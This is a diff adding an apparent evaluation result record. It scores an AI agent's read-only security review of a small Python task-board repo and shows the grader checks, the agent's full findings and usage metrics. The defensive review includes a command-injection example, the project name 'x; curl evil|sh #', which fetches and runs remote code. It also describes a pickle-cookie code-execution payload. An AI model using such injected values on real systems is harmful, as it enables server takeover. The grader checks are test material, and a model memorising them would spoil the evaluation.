@@ -1,0 +1,100 @@
+{
+  "case": "h5-review#t1",
+  "arm": "vanilla",
+  "model": "sonnet",
+  "checks": {
+    "read_only": true,
+    "names_pickle_session": true,
+    "names_command_injection": true,
+    "decoy_not_reported_as_vuln": true
+  },
+  "passed": true,
+  "score": 1.0,
+  "segments": 1,
+  "tools": {
+    "Bash": 2
+  },
+  "agent_calls": 0,
+  "agent_types": [],
+  "agent_descriptions": [],
+  "final": "I read all of the code (about 100 lines) and changed nothing. I found three real problems and two smaller ones.\n\n## High severity\n\n**1. Remote code execution through the session cookie: `taskboard/session.py:13`**\n- `load_session` runs `pickle.loads` on the base64-decoded `tb_session` cookie, which the browser controls.\n- The cookie is also unsigned and has no MAC, so anyone can send a pickle payload. Its `__reduce__` runs arbitrary code on the server when the cookie is loaded.\n- This works without logging in, because the cookie is parsed before anything is authenticated.\n- Fix: stop using pickle for sessions. Use JSON, signed with an HMAC, or use your web framework's signed-cookie sessions. `notify.sign` and `notify.verify` already do HMAC, so you could build on them. Check the signature before you parse anything.\n\n**2. Shell command injection: `taskboard/exports.py:8`**\n- `subprocess.run(f\"zip -rq {archive} {attachments_dir}\", shell=True)` puts the user-typed `project` name (via `archive`) straight into a shell string.\n- A project named `x; curl evil|sh #` runs commands on the server.\n- A project name like `../../etc/foo` or one starting with `-` also gets through, since the name is never validated.\n- `attachments_dir` is also interpolated into the shell string. Treat it as untrusted unless you know it is fixed.\n- Fix: call `subprocess.run([\"zip\", \"-rq\", archive, attachments_dir], check=True)` with no shell.\n- Also check the project name against an allowlist such as `[A-Za-z0-9_-]+`.\n- Confirm that the resolved archive path stays inside `out_dir`.\n- Better still, use Python's `zipfile` or `shutil.make_archive`, so you don't run `zip` at all.\n\n## Medium / low severity\n\n**3. Hardcoded fallback signing key: `taskboard/notify.py:7`**\n- If `TB_SIGNING_KEY` isn't set, the code silently uses `\"dev-only-key\"`. That string is public in the source, so anyone can forge signatures.\n- A forgotten environment variable in production would go unnoticed.\n- Fix: raise an error at startup if the variable is missing, outside an explicit dev mode.\n\n**4. Process-wide shared in-memory database: `taskboard/db.py`**\n- This isn't directly exploitable. One global `sqlite3` connection is shared by everything. It is `:memory:`, so data is lost on restart.\n- sqlite3 connections are not thread-safe by default, so a threaded server will hit errors or races.\n- Authorization isn't enforced in the data layer. `tasks_for_owner(owner)` and `list_tasks(project)` return rows for whatever name is passed in. If the caller takes that name from the request instead of the session, anyone could read other people's tasks. This depends on code that isn't in this repo.\n\n## What looks fine\n- **SQL:** `queries.py` uses `?` placeholders for values. The sort column goes through an allowlist (`SORT_COLUMNS`), which is the right pattern. An unknown value falls back to `id`, which `tests/test_basic.py:11` checks. `db.add_task` is parameterized too.\n- **HMAC check:** `notify.verify` uses `hmac.compare_digest`, so it is constant-time.\n\n## Missing from this repo\nThere is no web layer here, so I couldn't check authentication, CSRF, cookie flags (`HttpOnly`, `Secure`, `SameSite`), or input validation at the request boundary. Review those where the app calls these modules.\n\nFix the pickle session and the `shell=True` export first. Either one lets an attacker run code on your server.",
+  "is_error": false,
+  "num_turns": 3,
+  "duration_ms": 13695,
+  "cost_usd": 0.0573394,
+  "usage": {
+    "input_tokens": 6,
+    "cache_creation_input_tokens": 8141,
+    "cache_read_input_tokens": 100534,
+    "output_tokens": 1471
+  },
+  "model_usage": {
+    "claude-sonnet-5-5": {
+      "inputTokens": 6,
+      "outputTokens": 1471,
+      "cacheReadInputTokens": 100534,
+      "cacheCreationInputTokens": 8141,
+      "webSearchRequests": 0,
+      "costUSD": 0.0573394,
+      "contextWindow": 200000,
+      "maxOutputTokens": 128000,
+      "thinkingTokens": 0,
+      "cacheCreationEphemeral5mInputTokens": 0,
+      "cacheCreationEphemeral1hInputTokens": 8141,
+      "canonicalModel": "claude-sonnet-5-5",
+      "provider": "firstParty",
+      "costBasis": "list"
+    }
+  },
+  "subagent_stats": {
+    "spawned": 0,
+    "requested": {
+      "background": 0,
+      "foreground": 0,
+      "unset": 0
+    },
+    "started_in_background": 0,
+    "max_depth": 0,
+    "spawned_by_subagents": 0,
+    "completed": 0,
+    "failed": 0,
+    "killed": {
+      "parent": 0,
+      "user": 0,
+      "system": 0
+    },
+    "refused": {
+      "depth_limit": 0,
+      "concurrency_limit": 0,
+      "budget": 0
+    },
+    "by_type": {}
+  },
+  "permission_denials": 0,
+  "wall_s": 14.7,
+  "claude_rc": 0,
+  "invalid": null,
+  "workspace": "/tmp/ult-live-h/h5-review#t1__vanilla",
+  "transcript": "/tmp/ult-live-h/h5-review#t1__vanilla.jsonl",
+  "arch": {
+    "new_counts": {},
+    "arch_findings": 0,
+    "arch_blocking": 0
+  },
+  "metrics": {
+    "pass": true,
+    "graders_pass": true,
+    "total_cost_usd": 0.0573394,
+    "input_tokens": 6,
+    "output_tokens": 1471,
+    "cache_read_tokens": 100534,
+    "cache_write_tokens": 8141,
+    "turns": 3,
+    "subagents": 0,
+    "invalid": false,
+    "arch_measured": true,
+    "arch_blocking": 0,
+    "arch_findings": 0,
+    "total_tokens": 110152
+  }
+}
